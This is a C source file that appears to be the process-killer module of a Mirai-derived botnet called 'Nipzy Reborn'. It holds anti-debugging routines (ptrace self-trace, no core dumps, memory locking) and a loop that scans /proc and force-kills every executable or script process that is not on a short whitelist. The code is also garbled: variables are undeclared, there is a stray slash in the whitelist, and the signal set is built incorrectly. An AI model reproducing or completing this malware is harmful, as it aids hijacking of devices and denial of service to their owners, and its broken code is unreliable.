// Coded by virtual and queered for Nipzy Reborn

/*
Rewrote
*/

#define _GNU_SOURCE

#include <dirent.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/signalfd.h>
#include <sys/epoll.h>

#define MAX_PATH_LEN 512
#define MAX_CMD_LEN 1024

// Whitelist of system processes that should not be killed
const char *whitelist[] = {
"/usr/sbin/sshd",
"/sbin/init",/
"/usr/sbin/httpd",
"/usr/bin/python3",
NULL
};

int is_whitelisted(char *exe_path) {
int i = 0;
while (whitelist[i] != NULL) {
if (strstr(exe_path, whitelist[i]) != NULL) {
return 1;
}
i++;
}
return 0;
}

void disable_ptrace(void)
{
if (prctl(PR_SET_DUMPABLE, 0) != 0)
{
perror("prctl");
exit(EXIT_FAILURE);
}
if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0)
{
    perror("ptrace");
    exit(EXIT_FAILURE);
}

if (setuid(geteuid()) == -1)
{
    perror("setuid");
    exit(EXIT_FAILURE);
}

if (mlockall(MCL_CURRENT | MCL_FUTURE) == -1)
{
    perror("mlockall");
    exit(EXIT_FAILURE);
}

struct rlimit rlim = {0};
if (setrlimit(RLIMIT_CORE, &rlim) == -1)
{
    perror("setrlimit");
    exit(EXIT_FAILURE);
}
}
static BOOL has_exe_access(void)
{
char path[PATH_MAX], *ptr_path = path, tmp[16];
int fd, k_rp_len;
table_unlock_val(TABLE_KILLER_PROC);
table_unlock_val(TABLE_KILLER_EXE);

// Copy /proc/$pid/exe into path
ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_PROC, NULL));
ptr_path += util_strcpy(ptr_path, util_itoa(getpid(), 10, tmp));
ptr_path += util_strcpy(ptr_path, table_retrieve_val(TABLE_KILLER_EXE, NULL));

if ((k_rp_len = readlink(path, killer_realpath, PATH_MAX - 1)) != -1)
{
    killer_realpath[k_rp_len] = 0;
#ifdef DEBUG
printf("(killer/detect): detected we are running out of %s\n", killer_realpath);
#endif
return TRUE;
}
util_zero(path, ptr_path - path);

table_lock_val(TABLE_KILLER_PROC);
table_lock_val(TABLE_KILLER_EXE);

return FALSE;
}
int killer_init() {
struct epoll_event ev;
DIR *dir;
struct dirent **entries;
char path[MAX_PATH_LEN], cmd[MAX_CMD_LEN], exe_path[MAX_PATH_LEN];
int n_entries, epoll_fd, sig_fd;
if (has_exe_access()) {
    disable_ptrace();
}

// Create an epoll instance
epoll_fd = epoll_create1(0);
if (epoll_fd == -1) {
    perror("epoll_create1");
    exit(EXIT_FAILURE);
}

// Create a signalfd instance to listen for SIGTERM and SIGINT signals
sig_fd = signalfd(-1, &(sigset_t){SIGTERM, SIGINT}, 0);

    if (sig_fd == -1) {
        perror("signalfd");
        exit(EXIT_FAILURE);
    }

    // Set the signal mask to include SIGTERM and SIGINT
    sigemptyset(&mask);
    sigaddset(&mask, SIGTERM);
    sigaddset(&mask, SIGINT);
    if (sigprocmask(SIG_BLOCK, &mask, NULL) == -1) {
        perror("sigprocmask");
        exit(EXIT_FAILURE);
    }

    // We don't want the killer to stop
    while (TRUE) {
        // Wait for a signal to be received
        if (read(sig_fd, &info, sizeof(struct signalfd_siginfo)) != sizeof(struct signalfd_siginfo)) {
            perror("read");
            exit(EXIT_FAILURE);
        }

        // Check if the signal was SIGTERM or SIGINT
        if (info.ssi_signo == SIGTERM || info.ssi_signo == SIGINT) {
            // Exit the loop and terminate the process
            break;
        }

        // Open the /proc directory to get the list of running processes
        dir = opendir("/proc");
        if (dir == NULL) {
            exit(1);
        }

        // Iterate over each process directory in /proc
        while ((entry = readdir(dir)) != NULL) {
            // Skip non-numeric directories
            if (!isdigit(*entry->d_name))
                continue;

            // Build the path to the executable file for this process
            snprintf(path, MAX_PATH_LEN, "/proc/%s/exe", entry->d_name);

            // Read the symbolic link to get the actual path to the executable
            ssize_t len = readlink(path, exe_path, sizeof(exe_path)-1);
            if (len == -1)
                continue;

            exe_path[len] = '\0';

            if (is_whitelisted(exe_path))
                continue;

            // Check if the process is malware
            snprintf(cmd, MAX_CMD_LEN, "file -b \"%s\" | grep -i -q -e \"executable\" -e \"script\"", exe_path);
            if (system(cmd) == 0) {
                int pid = atoi(entry->d_name);
                kill(pid, 9);
            }
        }

        closedir(dir);
    }

    // Clean up the signal fd
    close(sig_fd);

    return 0;
}
